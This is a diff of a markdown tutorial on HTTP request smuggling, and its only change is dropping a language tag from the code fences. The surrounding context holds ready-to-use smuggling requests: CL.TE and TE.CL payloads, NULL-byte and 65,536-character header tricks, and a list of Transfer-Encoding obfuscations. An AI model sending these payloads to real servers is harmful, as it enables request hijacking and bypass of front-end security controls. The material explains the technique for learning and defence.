@@ -20,7 +20,7 @@ This means that suddenly, it's crucial that the back-end agrees with the front-e
 Let's imagine that the front-end prioritises the first content-length header, and the back-end prioritises the second.
  From the back-end's perspective, the TCP stream might look something like:
 
-```http request
+```
 POST / HTTP/1.1
 Host: example.com
 Content-Length: 6
@@ -56,7 +56,7 @@ Using a NULL byte character in a header causes the request to be rejected and pr
 
 A valid pipeline might look something like:
 
-```http request
+```
 GET / HTTP/1.1
 Host: example.com
 X-Something: \0 something
@@ -72,7 +72,7 @@ Generates 2 error `400 Bad Request`, because the second query is starting with `
 
 An invalid pipeline might look something like (as there'is no `\r\n` between the 2 queries):
 
-```http request
+```
 GET / HTTP/1.1
 Host: example.com
 X-Something: \0 something
@@ -86,7 +86,7 @@ It generates one error `400 Bad Request` and one `200 OK` response. Second query
 But line `GET /index.html?bar=1 HTTP/1.1` is a bad header and most agent will reject early the fake pipeline as a bad
  query, because
 
-```http request
+```
 GET /index.html?bar=1 HTTP/1.1
     !=
 <HEADER-NAME-NO-SPACE>[:][SP]<HEADER-VALUE>[CR][LF]
@@ -106,7 +106,7 @@ But in the absolute uri syntax the special `[:]` comes with the line, and the ba
  will only be a space. This will also fix the potential presence of the double `Host` header (absolute uri does replace 
  the `Host` header).
 
-```http request
+```
 GET / HTTP/1.1
 Host: example.com
 X-Something: \0 something
@@ -124,7 +124,7 @@ This attack also as the previous is trigger the end-of-query event, but do not n
  trigger an end-of-query event using headers of about 65536 characters, and exploit it in the same way like with the
  NULL premature end of query.
 
-```http request
+```
 GET / HTTP/1.1
 Host: example.com
 X-Something: AAAAA...( 65 532 'A' )...AAA
@@ -158,7 +158,7 @@ Whenever we find a way to hide the `Transfer-Encoding` header from one server in
 A chunked message body consists of 0 or more chunks. Each chunk consists of the chunk size, followed by a newline (\r\n),
  followed by the chunk contents. The message is terminated with a chunk of size 0, followed by a newline (\r\n). Example:
 
-```http request
+```
 POST / HTTP/1.1
 Host: example.com
 Transfer-Encoding: chunked
@@ -198,7 +198,7 @@ And [RFC 7230 3.2.4](https://tools.ietf.org/html/rfc7230#section-3.2.4) adds:
 The front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
  We can perform a simple HTTP request smuggling attack as follows:
 
-```http request
+```
 POST / HTTP/1.1
 Host: example.com
 Content-Length: 13
@@ -222,7 +222,7 @@ The back-end server processes the `Transfer-Encoding` header, and so treats the 
 The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. 
  We can perform a simple HTTP request smuggling attack as follows:
 
-```http request
+```
 POST / HTTP/1.1
 Host: example.com
 Content-Length: 3
@@ -250,36 +250,36 @@ The front-end and back-end servers both support the `Transfer-Encoding` header, 
 
 There are potentially endless ways to obfuscate the `Transfer-Encoding` header, for example:
 
-```http request
+```
 Transfer-Encoding: xchunked
 ```
-```http request
+```
 Transfer-Encoding[SPACE]: chunked
 ```
-```http request
+```
 Transfer-Encoding: chunked
 Transfer-Encoding: x
 ```
-```http request
+```
 Transfer-Encoding:[TAB]chunked
 ```
-```http request
+```
 [SPACE]Transfer-Encoding: chunked
 ```
-```http request
+```
 X: X[\n]Transfer-Encoding: chunked
 ```
-```http request
+```
 Transfer-Encoding
 : chunked
 ```
-```http request
+```
 Transfer-Encoding: chùnked
 ```
-```http request
+```
 Transfer-Encoding: \x00chunked
 ```
-```http request
+```
 Foo: bar\r\n\rTransfer-Encoding: chunked
 ```
 
